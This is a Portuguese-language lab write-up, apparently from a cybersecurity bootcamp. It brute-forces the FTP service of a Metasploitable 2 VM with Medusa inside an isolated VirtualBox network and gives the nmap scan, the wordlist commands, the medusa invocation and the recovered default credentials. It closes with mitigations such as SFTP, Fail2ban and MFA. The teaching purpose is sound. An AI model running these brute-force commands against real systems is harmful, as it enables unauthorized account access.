# 🛡️ Laboratório de Cibersegurança: Simulação de Ataques de Força Bruta e Mitigações com Medusa

Projeto prático desenvolvido como parte do bootcamp **Santander - Cibersegurança do Zero à Prática** na plataforma [DIO](https://dio.me).

---

## ⚖️ Aviso Legal (Disclaimer)

> **Aviso:** Todo o conteúdo deste laboratório foi executado estritamente em um ambiente isolado e controlado (*Host-Only* no VirtualBox), com o propósito exclusivo de aprendizado técnico em cibersegurança e análise de vulnerabilidades, em conformidade com as boas práticas éticas e a legislação vigente (Lei nº 12.737/2012 - Delitos Informáticos).

---

## 🎯 Objetivos do Projeto

- Configurar e operar um ambiente seguro de testes utilizando o VirtualBox.
- Compreender na prática o funcionamento de ataques de força bruta (*brute force*).
- Utilizar a ferramenta **Medusa** no **Kali Linux** para auditoria de segurança em serviços de rede.
- Documentar processos técnicos e evidências com padrão profissional.
- Propor contramedidas e controles de segurança defensiva (*Blue Team*) para mitigação dos riscos.

---

## 🖥️ Topologia do Ambiente

| Máquina Virtual | Sistema Operacional | Papel / Função | Endereço IP |
| :--- | :--- | :--- | :--- |
| **Atacante** | Kali Linux | Execução dos testes e auditoria | `192.168.56.102` |
| **Alvo** | Metasploitable 2 | Hospedagem dos serviços vulneráveis | `192.168.56.101` |

---

## 📂 Cenário 1: Força Bruta no Serviço FTP (Porta 21)

O protocolo FTP (*File Transfer Protocol*) em sua forma tradicional transmite credenciais em texto claro e, quando associado a senhas fracas ou falta de bloqueio de tentativas, torna-se um vetor crítico de intrusão.

---

### Passo 1: Configuração do Ambiente no VirtualBox
Inicialização e verificação das duas máquinas virtuais configuradas em rede interna exclusiva (*Host-Only*).

![Configuração das VMs no VirtualBox](images/ambiente-controlado-metasploitable-kali.png)

---

### Passo 2: Descoberta do IP da Máquina Alvo
No terminal da máquina vulnerável (Metasploitable 2), foi verificado o endereço IP atribuído:

```bash
ip a
```
> O IP identificado da máquina vulnerável foi `192.168.56.101`.

![Descoberta do IP](images/ip-alvo-metasploitable.png)

---

### Passo 3: Teste de Conectividade
A partir da máquina atacante (Kali Linux), foi executado um teste de ping para garantir comunicação direta com o alvo:

```bash
ping -c 4 192.168.56.101
```
- `-c 4`: Limita o envio a 4 pacotes ICMP.

![Teste de Ping](images/teste-ping-atacante-alvo.png)

---

### Passo 4: Enumeração de Portas e Serviços (Nmap)
Varredura direcionada para identificar as versões dos serviços ativos nas portas de interesse:

```bash
nmap -sV -p 21,22,80,445,139 -n 192.168.56.101
```
- `-sV`: Detecta a versão dos serviços em execução.
- `-p 21,22,80,445,139`: Escaneia especificamente as portas dos serviços sob análise.
- `-n`: Desativa a resolução reversa de DNS (otimiza a velocidade do scan em laboratórios isolados).

![Varredura Nmap](images/enumeracao-alvo.png)

---

### Passo 5: Validação Manual do Serviço FTP
Confirmação de que o serviço FTP na porta 21 estava ativo e aceitando conexões de rede:

```bash
ftp 192.168.56.101
```

![Validação do Serviço FTP](images/teste-ftp-ativo-alvo.png)

---

### Passo 6: Criação das Wordlists Personalizadas
Geração de listas personalizadas contendo candidatos a usuários e senhas para o teste:

```bash
# Lista de usuários comuns
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

# Lista de senhas potenciais
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

![Criação das Wordlists](images/criacao-wordlist-users-passwords-ftp.png)

---

### Passo 7: Conferência dos Arquivos de Wordlist
Visualização do conteúdo das listas criadas com o comando `cat`:

```bash
cat users.txt
cat pass.txt
```

![Wordlists Criadas](images/verificacao-wordlist-users-passwords.png)

---

### Passo 8: Ataque de Força Bruta com Medusa
Execução do ataque automatizado de força bruta contra o serviço FTP:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 -f
```
**Parâmetros explicados:**
- `-h 192.168.56.101`: Endereço IP do host alvo.
- `-U users.txt`: Arquivo com a lista de usuários a serem testados.
- `-P pass.txt`: Arquivo com a lista de senhas a serem testadas.
- `-M ftp`: Módulo do Medusa para o protocolo FTP.
- `-t 6`: Execução com 6 threads simultâneas para otimizar o tempo de varredura.
- `-f`: Interrompe a execução assim que encontrar o primeiro par válido de credenciais (*stop on first hit*).

![Execução e Sucesso do Medusa](images/ataque-medusa-ftp.png)

---

### Passo 9: Validação das Credenciais Obtidas
Teste prático de autenticação no serviço FTP com as credenciais descobertas pelo Medusa (`msfadmin:msfadmin`):

```bash
ftp 192.168.56.101
```
> **Resultado:** Acesso autorizado concedido com sucesso ao servidor FTP.

![Login com Credenciais Obtidas](images/teste-credenciais-obtidas-medusa-ftp.png)

---

## 🛡️ Medidas de Mitigação para o Serviço FTP

Do ponto de vista de segurança defensiva (*Blue Team*), as seguintes contramedidas devem ser aplicadas:

1. **Desativação de Serviços Desnecessários (Redução da Superfície de Ataque):** Caso o serviço FTP não seja estritamente necessário para as operações da organização, ele deve ser desativado ou desinstalado. Manter portas e serviços ociosos abertos amplia riscos desnecessários.
2. **Substituição por Protocolos Criptografados:** Descontinuar o uso do FTP clássico (que trafega credenciais em texto claro) e migrar para **SFTP** (via SSH) ou **FTPS** (com criptografia TLS/SSL).
3. **Prevenção de Ataques de Força Bruta (Fail2ban / Rate Limiting):** Configurar ferramentas de proteção ativa para monitorar os logs e banir temporariamente endereços IP que excedam limites de tentativas inválidas consecutivas (ex.: 3 a 5 falhas).
4. **Políticas Rígidas de Senhas e Adoção de MFA:** Exigir senhas longas e complexas, proibir credenciais padrão do sistema (como `msfadmin:msfadmin`) e implementar, prioritariamente, **Autenticação Multifator (MFA)** como camada adicional de verificação.
5. **Segmentação de Rede e Firewall:** Isolar o serviço através de regras de firewall, liberando a porta apenas para endereços IP e dispositivos previamente autorizados (*whitelist*).
